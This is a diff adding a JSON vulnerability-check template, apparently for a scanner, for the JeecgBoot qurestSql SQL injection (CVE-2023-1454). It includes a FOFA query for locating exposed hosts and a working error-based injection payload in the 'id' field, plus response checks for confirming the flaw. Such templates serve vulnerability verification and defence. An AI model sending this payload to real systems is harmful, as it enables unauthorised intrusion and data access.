@@ -1,0 +1,42 @@
+{
+  "product": "JeecgBoot",
+  "vul_name": "JeecgBoot qurestSql前台SQL注入",
+  "type": "SQL注入",
+  "vul_id": [
+    "CVE-2023-1454"
+  ],
+  "level": 3,
+  "vul_desc": "jeecg-boot 3.5.0版本存在SQL注入漏洞，该漏洞源于文件 jmreport/qurestSql 存在安全问题， 通过参数 apiSelectId 导致SQL注入。",
+  "version": "Jeecg-Boot<=3.5.1",
+  "note": "",
+  "search": {
+    "FOFA": "body=\"jeecg-boot\""
+  },
+  "protocol": "http",
+  "link": "https://download.csdn.net/blog/column/12593339/136636128",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/jeecg-boot/jmreport/qurestSql",
+      "json": {
+        "apiSelectId": "1316997232402231298",
+        "id": "1' or '%1%' like (updatexml(0x7e,concat(1,(select MD5(123456))),1)) or '%%' like '"
+      }
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "e10adc3949ba59abbe56e057f20f883e"
+        },
+        {
+          "body": "syntax error"
+        }
+      ]
+    }
+  }
+}
